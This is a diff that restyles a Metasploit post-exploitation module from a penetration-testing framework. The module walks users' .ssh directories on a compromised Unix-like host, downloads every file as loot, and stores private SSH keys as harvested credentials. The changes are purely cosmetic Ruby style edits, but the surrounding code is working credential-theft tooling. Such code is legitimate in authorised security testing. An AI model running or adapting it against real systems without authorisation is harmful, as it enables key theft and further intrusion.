@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => ['Jim Halfpenny'],
-        'Platform' => %w{bsd linux osx unix},
+        'Platform' => %w[bsd linux osx unix],
         'SessionTypes' => ['meterpreter', 'shell' ],
         'Compat' => {
           'Meterpreter' => {
@@ -36,13 +36,13 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Finding .ssh directories")
-    paths = enum_user_directories.map { |d| d + "/.ssh" }
+    print_status('Finding .ssh directories')
+    paths = enum_user_directories.map { |d| d + '/.ssh' }
     # Array#select! is only in 1.9
     paths = paths.select { |d| directory?(d) }
 
-    if paths.nil? or paths.empty?
-      print_error("No users found with a .ssh directory")
+    if paths.nil? || paths.empty?
+      print_error('No users found with a .ssh directory')
       return
     end
 
@@ -61,19 +61,19 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      if session.type == "meterpreter"
+      if session.type == 'meterpreter'
         sep = session.fs.file.separator
         files = session.fs.dir.entries(path)
       else
         # Guess, but it's probably right
-        sep = "/"
+        sep = '/'
         files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
       end
       path_array = path.split(sep)
       path_array.pop
       user = path_array.pop
       files.each do |file|
-        next if [".", ".."].include?(file)
+        next if ['.', '..'].include?(file)
 
         file_path = "#{path}#{sep}#{file}"
 
@@ -85,28 +85,28 @@ class MetasploitModule < Msf::Post
         data = read_file("#{path}#{sep}#{file}")
         file = file.split(sep).last
 
-        loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
+        loot_path = store_loot("ssh.#{file}", 'text/plain', session, data, "ssh_#{file}", "OpenSSH #{file} File")
         print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
         # store only ssh private keys
-        unless SSHKey.valid_ssh_public_key? data
-          begin
-            key = SSHKey.new(data, :passphrase => "")
+        next if SSHKey.valid_ssh_public_key? data
 
-            credential_data = {
-              origin_type: :session,
-              session_id: session_db_id,
-              post_reference_name: self.refname,
-              private_type: :ssh_key,
-              private_data: key.key_object.to_s,
-              username: user,
-              workspace_id: myworkspace_id
-            }
+        begin
+          key = SSHKey.new(data, passphrase: '')
 
-            create_credential(credential_data)
-          rescue OpenSSL::OpenSSLError => e
-            print_error("Could not load SSH Key: #{e.message}")
-          end
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: refname,
+            private_type: :ssh_key,
+            private_data: key.key_object.to_s,
+            username: user,
+            workspace_id: myworkspace_id
+          }
+
+          create_credential(credential_data)
+        rescue OpenSSL::OpenSSLError => e
+          print_error("Could not load SSH Key: #{e.message}")
         end
       end
     end
